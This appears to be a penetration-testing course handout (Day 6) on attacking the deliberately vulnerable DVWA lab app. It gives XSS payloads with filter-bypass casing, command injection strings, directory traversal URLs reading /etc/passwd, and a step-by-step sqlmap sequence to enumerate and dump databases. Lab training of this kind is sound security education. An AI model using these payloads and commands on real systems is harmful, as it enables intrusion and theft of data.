# Day 6 (Web Application Penetration Testing)

## What is Web Application Penetration Testing?

Web application penetration testing is the process of using penetration testing techniques on a web application to detect its vulnerabilities.It is similar to a penetration test and aims to break into the web application using any penetration attacks or threats.

## Basic Web Concept

#### 1. HTTP response status codes

1. **1xx: Informational** : It means the request has been received and the process is continuing.
2. **2xx: Success** : It means the action was successfully received, understood, and accepted.
3. **3xx: Redirection** : It means further action must be taken in order to complete the request.
4. **4xx: Client Error** : It means the request contains incorrect syntax or cannot be fulfilled.
5. **5xx: Server Error** : It means the server failed to fulfill an apparently valid request.

#### 2. HTTP Methods 

1. **GET** : The GET method is used to retrieve information from the given server using a given URI. Requests using GET should only retrieve data and should have no other effect on the data.
2. **POST** : A POST request is used to send data to the server, for example, customer information, file upload, etc. using HTML forms.
3. **PUT** : Replaces all current representations of the target resource with the uploaded content..
4. **OPTIONS** : Describes the communication options for the target resource.
5. **HEAD** : Same as GET, but transfers the status line and header section only.
6. **DELETE** : Removes all current representations of the target resource given by a URI.
7. **CONNECT** : Establishes a tunnel to the server identified by a given URI.
8. **TRACE** : Performs a message loop-back test along the path to the target resource.

## Things we Need
**DVWA** : Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable.Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.

## Starting DVWA 

**1** : Start Metasploitable VM in Brdige Network Adapter<br>
**2** : Login to Metasploitable default credentials ``msfadmin:msfadmin``<br>
**3** : Note the IP of Metasploitable<br>
**4** : Browse that IP on any browser except Google Chrome <br>
**5** : Login to DVWA default credentials ``admin:password`` <br>

## Exploiting DVWA

### 1. Cross Site Scripting(XSS)

#### What is Cross Site Scripting?
Cross-site Scripting (XSS) is a client-side code injection attack. The attacker aims to execute malicious scripts in a web browser of the victim by including malicious code in a legitimate web page or web application. The actual attack occurs when the victim visits the web page or web application that executes the malicious code. The web page or web application becomes a vehicle to deliver the malicious script to the user’s browser. Vulnerable vehicles that are commonly used for Cross-site Scripting attacks are forums, message boards, and web pages that allow comments.

### Types of Cross Site Scripting
**1. Reflected Cross-Site Scripting**<br>
**2. Stored Cross-Site Scripting**

### Reflected Cross-Site Scripting

#### What is reflected cross-site scripting?
The most common type of XSS is Reflected XSS (Non-persistent XSS). In this case, the attackers payload has to be a part of the request that is sent to the web server. It is then reflected back in such a way that the HTTP response includes the payload from the HTTP request. Attackers use malicious links, phishing emails, and other social engineering techniques to lure the victim into making a request to the server. The reflected XSS payload is then executed in the user’s browser.

**Set security low**<br>
Payload : ```<script>alert("xss")</script>```

**Set security medium**<br>
Paylod : ```<ScrIpt>alert("xss")</ScrIpt>```

### Stored Cross-Site Scripting
The most damaging type of XSS is Stored XSS (Persistent XSS). An attacker uses Stored XSS to inject malicious content (referred to as the payload), most often JavaScript code, into the target application. If there is no input validation, this malicious code is permanently stored (persisted) by the target application, for example within a database. For example, an attacker may enter a malicious script into a user input field such as a blog comment field or in a forum post.

**Set security low**<br>
Payload : ```<script>alert("xss")</script>```<br>
This payload will work in Message field

**Set security medium**<br>
Paylod : ```<ScrIpt>alert("xss")</ScrIpt>```<br>
Use Inspect Element to change the given length for text area of name field and the execuete the above paylaod in name field 

#### More XSS Payloads
1. [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

### 2. Command Injection 
#### What is Command Injection?
Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.

**Set security low**<br>
Payload : ```127.0.0.1; pwd``` --> Prints working directory

**Set security low**<br>
Payload : ```192.168.0.1| pwd```

**More payloads**<br>
1.  Example payloads
```
127.0.0.1; pwd
127.0.0.1 || pwd
127.0.0.1 && pwd
127.0.0.1 & pwd
127.0.0.1 | pwd
```
2.  [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

### 3. File Inclusion
#### Types of Cross Site Scripting :
**1. Local File Inclusion** <br><br>
LFI vulnerabilities allow an attacker to read (and sometimes execute) files on the victim machine. This can be very dangerous because if the web server is misconfigured and running with high privileges, the attacker may gain access to sensitive information. If the attacker is able to place code on the web server through other means, then they may be able to execute arbitrary commands.<br>

**2. Remote File Inclusion**<br><br>
RFI vulnerabilities are easier to exploit but less common. Instead of accessing a file on the local machine, the attacker is able to execute code hosted on their own machine.

### Local File Inclusion

**Set security low**<br>
In the browser address bar, enter the following:<br><br>
``http://192.168.80.134/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd``<br><br>
The ``‘../’`` characters used in the example above represent a directory traversal. The number of ``‘../’`` sequences depends on the configuration and location of the target web server on the victim machine. Some experimentation may be required.<br>

**Set security medium**<br>
In the browser address bar, enter the following:<br>
``http://10.5.251.4/dvwa/vulnerabilities/fi/?page=files:///../../../../../../../../etc/passwd``<br>

**More payloads**<br>
1. [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

### 4. SQL Injection 
#### What is SQL Injection?
SQL Injection (SQLi) is a type of an injection attack that makes it possible to execute malicious SQL statements. These statements control a database server behind a web application. Attackers can use SQL Injection vulnerabilities to bypass application security measures. They can go around authentication and authorization of a web page or web application and retrieve the content of the entire SQL database. They can also use SQL Injection to add, modify, and delete records in the database.

#### Tool Used
**sqlmap** : sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a kick-ass detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

#### STEPS :
**1** : Start Burpsuite<br><br>
**2** : Install burp extenstion CO2 from Bwapp store from extension section  <br><br>
**3** : Set browser proxy to IP 127.0.0.1 and PORT 8080<br><br>
**4** : Intercept the DVWA traffic for sql <br><br>
**5** : Send that traffic to sqlmapper by right clicking on the intercept part<br><br>
**6** : Copy the code from CO2 sqlmap command<br><br>
**7** : The copied command will be like this <br>``-u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7"``<br><br>
**8** : Execute the folling commands<br>
```
sqlmap -u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7" --dbs
``` 
The above command will list the database anem which is present on the website if it is vulnerable. So from the list of database name copy any one database name which you want to explore more.<br><br>
**9** : Execute the folling commands
```
sqlmap -u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7" --dbs -D <The database name you copied earlier> --tables
```
Now this command will list the table name of that database<br><br>
**10** : Execute the folling commands
```
sqlmap -u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7" --dbs -D <The database name you copied earlier> -T <table name> --columns
```
The above command will list the coulmns name of the table<br><br>
**11** : Execute the folling commands
```
sqlmap -u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7" --dbs -D <The database name you copied earlier> -T <table name> -C <columns>
```
This command will list all the data which is present in that column<br><br>
**12** : Execute the folling commands
```
sqlmap -u "http://10.5.251.4:80/dvwa/vulnerabilities/sqli/?id=2^&Submit=Submit" --cookie="security=low;PHPSESSID=4ff2a823e64e9f7c2fdf14adfc4c6ef7" --dbs -D <The database name you copied earlier> -T <table name> -C <column name> --dump
```
This command will dump all the data present in that column

#### Further Reading on Sqlmap Usage
1. [Sqlmap](https://www.youtube.com/watch?v=yPMbb38pwVI)
2. [BurpSuite](https://www.youtube.com/watch?v=danMmjMt1og&list=PLWPirh4EWFpEiXbu4JgQG0KoX6-MU8FbT)

### 5. Arbitrary File Upload
#### What is Arbitrary File Upload?
As the name suggests Arbitrary File Upload Vulnerabilities is a type of vulnerability which occurs in web applications if the file type uploaded is not checked, filtered or sanitized. The main danger of these kind of vulnerabilities is that the attacker can upload a malicious PHP , ASP etc. script and execute it.

1. [File Upload Tutorial on DVWA](https://www.youtube.com/watch?v=_QyGCev6fCk&t=587s)
2. I've also personally made a tutorial on this and sent you the links. Please practice it. This is Very Imp.
